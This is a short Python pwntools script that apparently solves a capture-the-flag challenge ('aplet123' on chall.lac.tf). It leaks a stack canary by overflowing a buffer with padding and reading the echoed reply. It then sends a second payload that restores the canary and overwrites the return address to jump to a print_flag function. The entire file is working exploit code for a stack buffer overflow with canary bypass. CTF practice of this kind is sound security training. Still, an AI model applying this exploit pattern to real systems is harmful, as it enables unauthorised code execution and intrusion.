from pwn import *
from pwnlib.util.packing import *

context.arch = 'amd64'
context.log_level = 'DEBUG'


PADDING = 69
HOST, PORT = 'chall.lac.tf',31123
print_flag_addr = p64(0x004011e6)
#CANARY = 0x00c8c76db34f4c13

def converter(num):
    hex_val = hex(int(num))
    return hex_val

def pwn():
    p = remote(HOST, PORT)
    #p = process('./aplet123')
    p.recvline()
    p.sendline(b'A'*PADDING + b'i\'m')
    response = p.recvline()
    canary = b'\x00' + response[3:10]
    print(canary)
    p.sendline(b'A'*72 + canary + b'A'*8 + print_flag_addr)
    p.recvline()
    p.interactive()    
pwn()
